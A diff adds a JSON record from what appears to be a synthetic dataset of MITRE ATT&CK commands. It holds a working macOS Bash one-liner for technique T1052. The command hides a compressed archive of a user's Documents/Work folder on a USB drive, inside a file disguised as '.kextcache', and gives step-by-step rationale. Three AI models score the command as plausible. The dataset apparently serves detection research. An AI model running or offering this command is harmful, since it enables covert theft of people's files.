@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "dd if=/dev/zero of=\"/Volumes/UNTITLED/.kextcache\" bs=1m count=0 seek=200 && tar -czf - \"$HOME/Documents/Work\" | dd of=\"/Volumes/UNTITLED/.kextcache\" bs=1m conv=notrunc && sync",
+  "explanation": "Creates a sparse container file on the external drive and then writes a compressed archive into it without truncating, using dd to disguise content within a large file.",
+  "rationale_steps": [
+    "Pre-create a large sparse file on the USB to blend into disk usage.",
+    "Compress target data to stream form.",
+    "Write into the container with dd conv=notrunc to avoid changing file size metadata.",
+    "Sync to ensure all data is persisted offline."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-84fb1661",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are well-formed with balanced quotes, correct use of && and |, and valid tar and dd options for macOS.",
+        "semantic_score": 4,
+        "semantic_justification": "It compresses target data and writes it to a hidden file on an external volume using dd with notrunc to preserve a pre-sized container, aligning with T1052, though the sparse-file creation via count=0 seek may depend on filesystem support on the removable drive.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T10:26:42.800761Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, valid flags for dd and tar, proper use of && and pipe operators, and correct macOS-style path conventions.",
+        "semantic_score": 4,
+        "semantic_justification": "The approach correctly stages data onto a removable volume (/Volumes/UNTITLED) using a hidden dot-file disguised as a system cache (.kextcache), with sparse file pre-allocation and compressed tar piped through dd with conv=notrunc to embed content — operationally plausible for T1052, though count=0 in the first dd creates a zero-length sparse file rather than a 200MB pre-allocated container, which is a minor semantic gap but doesn't break the overall flow since seek=200 still sets the file size.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:42:13.322229Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid POSIX/macOS syntax for dd, tar, and logical operators with balanced quotes and correct flag usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively creates a sparse file to disguise the size and then overwrites it with compressed data, aligning perfectly with the exfiltration and obfuscation goals of T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:42:15.747583Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
